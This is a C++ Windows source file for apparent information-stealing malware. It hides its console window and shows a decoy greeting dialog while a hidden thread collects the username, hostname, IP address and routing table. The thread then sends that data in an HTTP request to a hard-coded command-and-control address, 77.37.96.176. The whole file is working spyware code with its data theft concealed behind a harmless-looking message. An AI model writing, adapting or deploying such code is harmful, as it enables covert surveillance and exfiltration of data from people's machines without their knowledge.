#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <string>
#include <sstream>
#include <thread>
#include <Lmcons.h>
#include <wininet.h>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// Convert narrow (UTF-8) string to wide (UTF-16)
std::wstring stringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
    return wstr;
}

// Gather system information
std::wstring gatherSystemInfo() {
    std::wstringstream dataStream;

    // Get Username
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameW(username, &username_len)) {
        dataStream << L"Username: " << username << L"\n";
    }

    // Get Hostname
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &hostname_len)) {
        dataStream << L"Hostname: " << hostname << L"\n";
    }

    // Get IP Address
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    char hostnameA[256];
    gethostname(hostnameA, sizeof(hostnameA));
    struct addrinfo hints = {}, * res;
    hints.ai_family = AF_INET;
    if (getaddrinfo(hostnameA, NULL, &hints, &res) == 0) {
        char ipStr[INET_ADDRSTRLEN];
        sockaddr_in* ipv4 = (sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &(ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
        dataStream << L"IP Address: " << stringToWString(ipStr) << L"\n";
        freeaddrinfo(res);
    }
    WSACleanup();

    // Get Route Table
    FILE* pipe = _popen("route print", "r");
    if (pipe) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe)) {
            dataStream << stringToWString(buffer);
        }
        _pclose(pipe);
    }

    return dataStream.str();
}

// Send data to C2 server
void sendDataToServer(const std::wstring& data, const std::wstring& serverIP) {
    HINTERNET hInternet, hConnect;
    LPCWSTR serverName = serverIP.c_str();
    LPCWSTR pathFormat = L"/%s?payload=%s";

    // Format the payload
    wchar_t formattedPayload[2048];
    swprintf(formattedPayload, sizeof(formattedPayload) / sizeof(wchar_t), pathFormat, L"EliaMamdouh", data.c_str());

    hInternet = InternetOpen(L"WinniitAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        return;
    }

    hConnect = InternetOpenUrlW(hInternet, (std::wstring(L"http://") + serverName + L":80" + formattedPayload).c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Background thread to gather and send data
void winniit(const std::wstring& serverIP) {
    std::wstring info = gatherSystemInfo();
    sendDataToServer(info, serverIP);
}

// Display welcome message
void showNormalScreen() {
    MessageBox(NULL, TEXT("Welcome! This is a Greeting Message from Windows"), TEXT("Winiinit"), MB_OK | MB_ICONINFORMATION);
}

// Entry point for the console application
int main() {
    // Hide the console window
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);

    std::wstring serverIP = L"77.37.96.176";

    std::thread visibleThread(showNormalScreen);    // Start visible thread
    std::thread hiddenThread(winniit, serverIP);    // Start hidden `winniit` thread

    visibleThread.join();
    hiddenThread.join();

    return 0;
}